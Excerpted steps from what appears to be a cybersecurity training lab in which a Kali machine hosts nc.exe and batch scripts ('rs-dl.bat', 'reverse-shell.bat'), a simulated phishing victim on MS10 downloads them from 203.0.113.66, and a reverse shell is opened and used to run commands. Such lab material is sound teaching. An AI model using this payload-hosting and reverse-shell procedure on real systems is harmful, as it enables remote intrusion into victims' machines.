...
Enter the following command to copy nc.exe to the web root folder: cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/nc.exe

/var/www/html/ is the web root directory for the local Apache web server on Kali.

Enter the following command to view the contents of the web root directory: ls -l /var/www/html/nc.exe
...
Enter cat /var/www/html/rs-dl.bat to view the exploit script.

This command will display the contents of the script rs-dl.bat, which is short for "remote shell download".

Enter cat /var/www/html/reverse-shell.bat to view the reverse shell script.
...
Connect to the MS10, send Ctrl+Alt+Delete, and sign in as Jaime using Pa$$w0rd as the password.

Minimize or close Server Manager if it appears. It will not be used in this lab.

Open Firefox using the desktop icon.

In the Firefox address bar, enter http://203.0.113.66/rs-dl.bat

This simulates the victim clicking on the link in the phishing message.

The download should happen quickly. The Firefox Downloads window should be displayed.

Select rs-dl.bat from the Downloads window.
...
Switch back to KALI and, if needed, sign in as root using Pa$$w0rd as the password.

The Terminal window should still be open.

It may take 10-15 seconds for the scripts on MS10 to complete. Wait for the connection to be established.

Once the outbound connection from the victim links to the reverse shell listener on Kali, it will display the following:
...
Enter hostname to display the system name.

Enter whoami to display the user account context.

You can experiment with other Windows commands through this reverse shell against the victim system.

Enter exit to break the connection.
